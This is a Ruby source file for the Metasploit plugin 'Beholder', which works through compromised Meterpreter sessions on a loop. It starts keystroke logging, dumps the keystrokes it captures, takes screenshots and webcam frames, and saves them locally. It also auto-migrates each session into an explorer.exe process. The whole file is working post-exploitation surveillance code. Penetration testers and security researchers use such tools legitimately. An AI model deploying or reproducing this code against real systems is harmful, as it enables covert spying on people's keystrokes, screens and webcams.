# -*- coding:binary -*-

require 'fileutils'

module Msf

class Plugin::Beholder < Msf::Plugin


  #
  # Worker Thread
  #

  class BeholderWorker
    attr_accessor :framework, :config, :driver, :thread
    attr_accessor :state

    def initialize(framework, config, driver)
      self.state     = { }
      self.framework = framework
      self.config    = config
      self.driver    = driver
      self.thread    = framework.threads.spawn('BeholderWorker', false) {
        begin
          self.start
        rescue ::Exception => e
          $stderr.puts "BeholderWorker: #{e.class} #{e.to_s} #{e.backtrace}"
        end

        # Mark this worker as dead
        self.thread = nil
      }
    end

    def stop
      return unless self.thread
      self.thread.kill rescue nil
      self.thread = nil
    end

    def start
      self.driver.print_status("Beholder is logging to #{self.config[:base]}")
      bool_options = [ :screenshot, :webcam, :keystrokes, :automigrate ]
      bool_options.each do |o|
        self.config[o] = !!( self.config[o].to_s =~ /^[yt1]/i)
      end

      int_options = [ :idle, :freq ]
      int_options.each do |o|
        self.config[o] = self.config[o].to_i
      end

      ::FileUtils.mkdir_p(self.config[:base])

      loop do
        framework.sessions.keys.each do |sid|
          begin
            if self.state[sid].nil? ||
              (self.state[sid][:last_update] + self.config[:freq] < Time.now.to_f)
              process(sid)
            end
          rescue ::Exception => e
            session_log(sid, "triggered an exception: #{e.class} #{e} #{e.backtrace}")
          end
        end
        sleep(1)
      end
    end

    def process(sid)
      self.state[sid] ||= {}
      store_session_info(sid)
      return unless compatible?(sid)
      return if stale_session?(sid)
      verify_migration(sid)
      cache_sysinfo(sid)
      collect_keystrokes(sid)
      collect_screenshot(sid)
      collect_webcam(sid)
    end

    def session_log(sid, msg)
      ::File.open(::File.join(self.config[:base], "session.log"), "a") do |fd|
        fd.puts "#{Time.now.strftime('%Y-%m-%d %H:%M:%S')} Session #{sid} [#{self.state[sid][:info]}] #{msg}"
      end
    end

    def store_session_info(sid)
      self.state[sid][:last_update] = Time.now.to_f
      return if self.state[sid][:initialized]
      self.state[sid][:info] = framework.sessions[sid].info
      session_log(sid, "registered")
      self.state[sid][:initialized] = true
    end

    def capture_filename(sid)
      self.state[sid][:name] + "_" + Time.now.strftime("%Y%m%d-%H%M%S")
    end

    def store_keystrokes(sid, data)
      return unless data.length > 0
      filename = capture_filename(sid) + "_keystrokes.txt"
      ::File.open(::File.join(self.config[:base], filename), "wb") {|fd| fd.write(data) }
      session_log(sid, "captured keystrokes to #{filename}")
    end

    def store_screenshot(sid, data)
      filename = capture_filename(sid) + "_screenshot.jpg"
      ::File.open(::File.join(self.config[:base], filename), "wb") {|fd| fd.write(data) }
      session_log(sid, "captured screenshot to #{filename}")
    end

    def store_webcam(sid, data)
      filename = capture_filename(sid) + "_webcam.jpg"
      ::File.open(::File.join(self.config[:base], filename), "wb") {|fd| fd.write(data) }
      session_log(sid, "captured webcam snap to #{filename}")
    end

    # TODO: Stop the keystroke scanner when the plugin exits
    def collect_keystrokes(sid)
      return unless self.config[:keystrokes]
      sess = framework.sessions[sid]
      unless self.state[sid][:keyscan]
        # Consume any error (happens if the keystroke thread is already active)
        sess.ui.keyscan_start rescue nil
        self.state[sid][:keyscan] = true
        return
      end

      collected_keys = sess.ui.keyscan_dump
      store_keystrokes(sid, collected_keys)
    end


    # TODO: Specify image quality
    def collect_screenshot(sid)
      return unless self.config[:screenshot]
      sess = framework.sessions[sid]
      collected_image = sess.ui.screenshot(50)
      store_screenshot(sid, collected_image)
    end

    # TODO: Specify webcam index and frame quality
    def collect_webcam(sid)
      return unless self.config[:webcam]
      sess = framework.sessions[sid]
      begin
        sess.webcam.webcam_start(1)
        collected_image = sess.webcam.webcam_get_frame(100)
        store_webcam(sid, collected_image)
      ensure
        sess.webcam.webcam_stop
      end
    end

    def cache_sysinfo(sid)
      return if self.state[sid][:sysinfo]
      self.state[sid][:sysinfo] = framework.sessions[sid].sys.config.sysinfo
      self.state[sid][:name] = "#{sid}_" + (self.state[sid][:sysinfo]['Computer'] || "Unknown").gsub(/[^A-Za-z0-9\.\_\-]/, '')
    end

    def verify_migration(sid)
      return unless self.config[:automigrate]
      return if self.state[sid][:migrated]
      sess = framework.sessions[sid]

      # Are we in an explorer process already?
      pid = sess.sys.process.getpid
      session_log(sid, "has process ID #{pid}")
      ps = sess.sys.process.get_processes
      this_ps = ps.select{|x| x['pid'] == pid }.first

      # Already in explorer? Mark the session and move on
      if this_ps && this_ps['name'].to_s.downcase == 'explorer.exe'
        session_log(sid, "is already in explorer.exe")
        self.state[sid][:migrated] = true
        return
      end

      # Attempt to migrate, but flag that we tried either way
      self.state[sid][:migrated] = true

      # Grab the first explorer.exe process we find that we have rights to
      target_ps = ps.select{|x| x['name'].to_s.downcase == 'explorer.exe' && x['user'].to_s != '' }.first
      unless target_ps
        # No explorer.exe process?
        session_log(sid, "no explorer.exe process found for automigrate")
        return
      end

      # Attempt to migrate to the target pid
      session_log(sid, "attempting to migrate to #{target_ps.inspect}")
      sess.core.migrate(target_ps['pid'])
    end

    # Only support sessions that have core.migrate()
    def compatible?(sid)
      framework.sessions[sid].respond_to?(:core) &&
      framework.sessions[sid].core.respond_to?(:migrate)
    end

    # Skip sessions with ancient last checkin times
    def stale_session?(sid)
      return unless framework.sessions[sid].respond_to?(:last_checkin)
      session_age = Time.now.to_i - framework.sessions[sid].last_checkin.to_i
      # TODO: Make the max age configurable, for now 5 minutes seems reasonable
      if session_age > 300
        session_log(sid, "is a stale session, skipping, last checked in #{session_age} seconds ago")
        return true
      end
      return
    end

  end


  #
  # Command Dispatcher
  #

  class BeholderCommandDispatcher
    include Msf::Ui::Console::CommandDispatcher

    @@beholder_config = {
      screenshot: true,
      webcam: false,
      keystrokes: true,
      automigrate: true,
      base: ::File.join(Msf::Config.get_config_root, "beholder", Time.now.strftime("%Y-%m-%d.%s")),
      freq: 30,
      # TODO: Only capture when the idle threshold has been reached
      idle: 0,
    }

   @@beholder_worker = nil

    def name
      "Beholder"
    end

    def commands
      {
        'beholder_start'         => "Start capturing data",
        'beholder_stop'          => "Stop capturing data",
        'beholder_conf'          => "Configure capture parameters",
      }
    end

    def cmd_beholder_stop(*args)
      unless @@beholder_worker
        print_error("Error: Beholder is not active")
        return
      end

      print_status("Beholder is shutting down...")
      stop_beholder
    end

    def cmd_beholder_conf(*args)
      parse_config(*args)
      print_status("Beholder Configuration")
      print_status("----------------------")
      @@beholder_config.each_pair do |k,v|
        print_status("  #{k}: #{v}")
      end
    end

    def cmd_beholder_start(*args)
      opts = Rex::Parser::Arguments.new(
        "-h"   => [ false,  "This help menu"],
      )

      opts.parse(args) do |opt, idx, val|
        case opt
        when "-h"
          print_line("Usage: beholder_start [base=</path/to/directory>] [screenshot=<true|false>] [webcam=<true|false>] [keystrokes=<true|false>] [automigrate=<true|false>] [freq=30]")
          print_line(opts.usage)
          return
        end
      end

      if @@beholder_worker
        print_error("Error: Beholder is already active, use beholder_stop to terminate")
        return
      end

      parse_config(*args)
      start_beholder
    end

    def parse_config(*args)
      new_config = args.map{|x| x.split("=", 2) }
      new_config.each do |c|
        unless @@beholder_config.has_key?(c.first.to_sym)
          print_error("Invalid configuration option: #{c.first}")
          next
        end
        @@beholder_config[c.first.to_sym] = c.last
      end
    end

    def stop_beholder
      @@beholder_worker.stop if @@beholder_worker
      @@beholder_worker = nil
    end

    def start_beholder
      @@beholder_worker = BeholderWorker.new(framework, @@beholder_config, driver)
    end

  end


  #
  # Plugin Interface
  #

  def initialize(framework, opts)
    super
    add_console_dispatcher(BeholderCommandDispatcher)
  end

  def cleanup
    remove_console_dispatcher('Beholder')
  end

  def name
    "beholder"
  end

  def desc
    "Capture screenshots, webcam pictures, and keystrokes from active sessions"
  end
end
end

